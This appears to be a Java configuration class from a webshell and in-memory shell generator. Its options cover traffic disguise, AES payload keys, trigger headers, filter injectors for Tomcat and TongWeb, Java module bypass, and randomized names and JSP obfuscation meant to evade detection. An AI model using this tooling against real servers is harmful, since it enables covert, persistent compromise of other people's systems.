package org.leo.jmg;


import org.leo.core.entity.Disguise;
import org.leo.core.util.request.ClassNameGenerator;
import org.leo.core.util.request.GenerationRandom;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

/**
 * Shell生成器配置类
 * 用于配置Shell生成器的各种参数
 * 
 * @author LeoSpring
 */
public class ShellGeneratorConfig {
    
    // 必需参数
    private Disguise reqDisguise;
    private Disguise respDisguise;
    /** User supplied AES key embedded into the generated Java Core. */
    private String payloadKey;
    
    // 可选参数
    private String coreClassName;
    private int respCode = 200;
    // 传输协议。WebShell 支持 http/httpchunk；内存构建支持 http/httpchunk/websocket。
    private String protocol = "http";
    // 中间件类型（用于注入器，需要用户明确指定宿主机中间件类型）
    private String serverType;
    // 中间件主版本；当前用于选择 TongWeb 6/7/8 的容器接口包名。
    private String serverVersion;
    private String shellType;
    private String packerType;
    private TargetJavaVersion targetJavaVersion = TargetJavaVersion.AUTO;
    private ServletNamespace servletNamespace = ServletNamespace.AUTO;

    // 内存马相关配置
    private String headerName;
    private String headerValue;

    // 可选的固定类名；为空时由执行工作区生成，不承载生成结果
    private String requestedShellClassName;
    private String requestedInjectorClassName;
    private String urlPattern = "/*";
    private boolean isAbstractTranslet = false;
    /** 是否显式启用 Java 模块兼容；目标为 JDK 9+ 时生成请求会自动启用。 */
    private boolean byPassJavaModule = false;
    /** 是否为 Shell 与 Injector 类名追加 Lambda 风格后缀。 */
    private boolean lambdaSuffix = false;
    /** 是否在 Injector 的静态初始化块中自动调用无参构造器。 */
    private boolean staticInitialize = false;
    /** 是否移除调试属性、注解和无关类元数据以缩小生成物。 */
    private boolean shrink = true;

    /**
     * 用户自定义 JSP/JSPX 混淆步骤 ID 列表（有序）。
     * 为 null 或空时 JSP Packer 使用默认 preset；非空时按此顺序构建 pipeline。
     */
    private List<String> jspObfuscationSteps;

    /** 用于复现一次完整生成过程；默认每个配置生成一个随机 seed。 */
    private long obfuscationSeed = ThreadLocalRandom.current().nextLong();

    /**
     * AI 生成的自定义 JSP 模板（含 {{VAR:}} / {{CLS:}} / {{base64Str}} 占位符）。
     * 非 null 时 JSP Packer 优先使用此模板，替代内置模板文件。
     */
    private String customJspTemplate;

    // LeoCore 私有方法随机名（生成时自动赋值，外部无需关心）
    private String methodAction;
    private String methodTestConn;
    private String methodRedirect;
    private String methodLoadComponent;
    private String methodInvokeComponent;
    private String methodPayloadEncode;
    private String methodPayloadDecode;
    private String methodTrafficEncode;
    private String methodTrafficDecode;
    private String methodProcessBuffer;

    // LeoCore 实例/静态字段随机名
    private String fieldParams;
    private String fieldResults;
    private String fieldHostId;
    private String fieldComponents;
    private String fieldPayloadSecret;
    private String fieldPayloadRandom;

    /**
     * 私有构造函数，使用Builder模式
     */
    private ShellGeneratorConfig() {
        initializeGeneratedNames();
    }

    private void initializeGeneratedNames() {
        java.util.Set<String> used = new java.util.HashSet<String>();
        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(obfuscationSeed)) {
            this.methodAction          = ClassNameGenerator.randomMethodName(used);
            this.methodTestConn        = ClassNameGenerator.randomMethodName(used);
            this.methodRedirect        = ClassNameGenerator.randomMethodName(used);
            this.methodLoadComponent   = ClassNameGenerator.randomMethodName(used);
            this.methodInvokeComponent = ClassNameGenerator.randomMethodName(used);
            this.methodPayloadEncode   = ClassNameGenerator.randomMethodName(used);
            this.methodPayloadDecode   = ClassNameGenerator.randomMethodName(used);
            this.methodTrafficEncode   = ClassNameGenerator.randomMethodName(used);
            this.methodTrafficDecode   = ClassNameGenerator.randomMethodName(used);
            this.methodProcessBuffer   = ClassNameGenerator.randomMethodName(used);

            this.fieldParams      = ClassNameGenerator.randomFieldName(used);
            this.fieldResults     = ClassNameGenerator.randomFieldName(used);
            this.fieldHostId      = ClassNameGenerator.randomFieldName(used);
            this.fieldComponents = ClassNameGenerator.randomFieldName(used);
            this.fieldPayloadSecret = ClassNameGenerator.randomFieldName(used);
            this.fieldPayloadRandom = ClassNameGenerator.randomFieldName(used);
        }
    }
    
    /**
     * 创建配置构建器
     *
     * @param reqDisguise  请求伪装器（必需）
     * @param respDisguise 响应伪装器（必需）
     * @return 配置构建器
     */
    public static Builder builder(Disguise reqDisguise, Disguise respDisguise) {
        return new Builder(reqDisguise, respDisguise);
    }

    /**
     * 配置构建器
     */
    public static class Builder {
        private ShellGeneratorConfig config;
        
        public Builder(Disguise reqDisguise, Disguise respDisguise) {
            config = new ShellGeneratorConfig();
            config.reqDisguise = reqDisguise;
            config.respDisguise = respDisguise;
        }

        public Builder payloadKey(String payloadKey) {
            if (payloadKey == null || payloadKey.trim().isEmpty()) {
                throw new IllegalArgumentException("payloadKey 不能为空");
            }
            config.payloadKey = payloadKey;
            return this;
        }
        
        /**
         * 设置核心类名
         */
        public Builder coreClassName(String coreClassName) {
            config.coreClassName = coreClassName;
            return this;
        }
        
        /**
         * 设置响应码
         */
        public Builder respCode(int respCode) {
            if (respCode < 100 || respCode > 599) {
                throw new IllegalArgumentException("respCode 必须在 100 到 599 之间，当前值: " + respCode);
            }
            config.respCode = respCode;
            return this;
        }
        
        /**
         * 设置传输协议。
         * 
         * @param protocol 传输协议类型（http、httpchunk、websocket），默认为 http
         * @return Builder实例
         */
        public Builder protocol(String protocol) {
            if (protocol != null && !protocol.trim().isEmpty()) {
                config.protocol = TransportProtocol.parse(protocol).getValue();
            }
            return this;
        }

        
        /**
         * 设置触发Header名称（用于内存马）
         */
        public Builder headerName(String headerName) {
            config.headerName = headerName;
            return this;
        }
        
        /**
         * 设置触发Header值（用于内存马）
         */
        public Builder headerValue(String headerValue) {
            config.headerValue = headerValue;
            return this;
        }
        
        /**
         * 设置Header信息（用于内存马）
         */
        public Builder header(String headerName, String headerValue) {
            config.headerName = headerName;
            config.headerValue = headerValue;
            return this;
        }
        
        /**
         * 设置注入器类名
         */
        public Builder injectorClassName(String injectorClassName) {
            config.requestedInjectorClassName = injectorClassName;
            return this;
        }
        
        /**
         * 设置Shell类名（用于注入器）
         */
        public Builder shellClassName(String shellClassName) {
            config.requestedShellClassName = shellClassName;
            return this;
        }
        
        /**
         * 设置URL匹配模式（用于注入器）
         */
        public Builder urlPattern(String urlPattern) {
            config.urlPattern = urlPattern;
            return this;
        }
        
        /**
         * 设置是否继承AbstractTranslet（用于注入器）
         */
        public Builder abstractTranslet(boolean isAbstractTranslet) {
            config.isAbstractTranslet = isAbstractTranslet;
            return this;
        }

        /**
         * 目标应用服务器类型，如 Tomcat，须与生成器目录中的 key 一致
         */
        public Builder serverType(String serverType) {
            if (serverType == null || serverType.trim().isEmpty()) {
                throw new IllegalArgumentException("serverType 不能为空");
            }
            config.serverType = serverType.trim();
            return this;
        }

        /** 设置目标中间件主版本，例如 TongWeb Valve 使用 6、7 或 8。 */
        public Builder serverVersion(String serverVersion) {
            config.serverVersion = serverVersion == null
                    ? null
                    : serverVersion.trim();
            return this;
        }

        /**
         * 注入器形态名称，如 FilterInjector，须为该 serverType 下支持的注入器名
         */
        public Builder shellType(String shellType) {
            if (shellType == null || shellType.trim().isEmpty()) {
                throw new IllegalArgumentException("shellType 不能为空");
            }
            config.shellType = shellType.trim();
            return this;
        }

        /**
         * 打包器类型，与 {@link org.leo.jmg.mem.packer.PackerRegistry} 中注册的名称一致（忽略大小写）
         */
        public Builder packerType(String packerType) {
            if (packerType == null || packerType.trim().isEmpty()) {
                throw new IllegalArgumentException("packerType 不能为空");
            }
            config.packerType = packerType.trim();
            return this;
        }

        /** 设置生成物预期运行的 Java 版本；默认 AUTO。 */
        public Builder targetJavaVersion(TargetJavaVersion targetJavaVersion) {
            config.targetJavaVersion = targetJavaVersion == null
                    ? TargetJavaVersion.AUTO
                    : targetJavaVersion;
            return this;
        }

        /** 接受 API 字符串形式：auto、6、7、8、9+、17+。 */
        public Builder targetJavaVersion(String targetJavaVersion) {
            return targetJavaVersion(TargetJavaVersion.parse(targetJavaVersion));
        }

        /** 设置生成物使用的 Servlet API 命名空间。 */
        public Builder servletNamespace(ServletNamespace servletNamespace) {
            config.servletNamespace = servletNamespace == null
                    ? ServletNamespace.AUTO
                    : servletNamespace;
            return this;
        }

        /** 接受 API 字符串形式：auto、javax、jakarta。 */
        public Builder servletNamespace(String servletNamespace) {
            return servletNamespace(ServletNamespace.parse(servletNamespace));
        }

        public Builder byPassJavaModule(boolean byPassJavaModule) {
            config.byPassJavaModule = byPassJavaModule;
            return this;
        }

        public Builder lambdaSuffix(boolean lambdaSuffix) {
            config.lambdaSuffix = lambdaSuffix;
            return this;
        }

        public Builder staticInitialize(boolean staticInitialize) {
            config.staticInitialize = staticInitialize;
            return this;
        }

        public Builder shrink(boolean shrink) {
            config.shrink = shrink;
            return this;
        }

        public Builder jspObfuscationSteps(List<String> steps) {
            config.jspObfuscationSteps = steps == null
                    ? null
                    : Collections.unmodifiableList(new ArrayList<String>(steps));
            return this;
        }

        /** 设置固定 seed；相同请求和运行环境下可复现随机化结果。 */
        public Builder obfuscationSeed(long seed) {
            config.obfuscationSeed = seed;
            config.initializeGeneratedNames();
            return this;
        }

        public Builder customJspTemplate(String template) {
            config.customJspTemplate = template;
            return this;
        }

        /**
         * 构建配置对象
         */
        public ShellGeneratorConfig build() {
            // 如果核心类名为空，自动生成
            if (config.coreClassName == null || config.coreClassName.trim().isEmpty()) {
                try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.obfuscationSeed)) {
                    config.coreClassName = ClassNameGenerator.generateServletStyleClassName();
                }
            }
            return config;
        }
    }
    
    // Getter方法
    
    public Disguise getReqDisguise() {
        return reqDisguise;
    }
    
    public Disguise getRespDisguise() {
        return respDisguise;
    }

    public String getPayloadKey() {
        return payloadKey;
    }
    
    public String getCoreClassName() {
        return coreClassName;
    }
    
    public int getRespCode() {
        return respCode;
    }
    

    
    public String getHeaderName() {
        return headerName;
    }
    
    public String getHeaderValue() {
        return headerValue;
    }
    
    public String getRequestedInjectorClassName() {
        return requestedInjectorClassName;
    }
    
    public String getRequestedShellClassName() {
        return requestedShellClassName;
    }
    
    public String getUrlPattern() {
        return urlPattern;
    }
    
    public boolean isAbstractTranslet() {
        return isAbstractTranslet;
    }

    public String getServerType() {
        return serverType;
    }

    public String getServerVersion() {
        return serverVersion;
    }

    public String getShellType() {
        return shellType;
    }

    public String getPackerType() {
        return packerType;
    }

    public TargetJavaVersion getTargetJavaVersion() {
        return targetJavaVersion;
    }

    public ServletNamespace getServletNamespace() {
        return servletNamespace;
    }

    public ServletNamespace getEffectiveServletNamespace() {
        return servletNamespace.resolve();
    }

    public boolean isByPassJavaModule() {
        return byPassJavaModule;
    }

    public boolean isLambdaSuffix() {
        return lambdaSuffix;
    }

    public boolean isStaticInitialize() {
        return staticInitialize;
    }

    public boolean isShrink() {
        return shrink;
    }

    public List<String> getJspObfuscationSteps() {
        return jspObfuscationSteps;
    }

    public long getObfuscationSeed() {
        return obfuscationSeed;
    }

    public String getCustomJspTemplate() {
        return customJspTemplate;
    }

    public String getProtocol() {
        return protocol;
    }

    public static List<String> getSupportedWebShellProtocols() {
        return TransportProtocol.valuesAsStrings(
                TransportProtocol.HTTP, TransportProtocol.HTTP_CHUNK);
    }

    public static List<String> getSupportedMemoryShellProtocols() {
        return TransportProtocol.valuesAsStrings(TransportProtocol.values());
    }

    public String getMethodAction() {
        return methodAction;
    }

    public String getMethodTestConn() {
        return methodTestConn;
    }

    public String getMethodRedirect() {
        return methodRedirect;
    }

    public String getMethodLoadComponent() {
        return methodLoadComponent;
    }

    public String getMethodInvokeComponent() {
        return methodInvokeComponent;
    }

    public String getMethodPayloadEncode() { return methodPayloadEncode; }

    public String getMethodPayloadDecode() { return methodPayloadDecode; }

    public String getMethodTrafficEncode() { return methodTrafficEncode; }

    public String getMethodTrafficDecode() { return methodTrafficDecode; }

    public String getMethodProcessBuffer() { return methodProcessBuffer; }

    public String getFieldParams() {
        return fieldParams;
    }

    public String getFieldResults() {
        return fieldResults;
    }

    public String getFieldHostId() {
        return fieldHostId;
    }

    public String getFieldComponents() {
        return fieldComponents;
    }

    public String getFieldPayloadSecret() { return fieldPayloadSecret; }

    public String getFieldPayloadRandom() { return fieldPayloadRandom; }

}
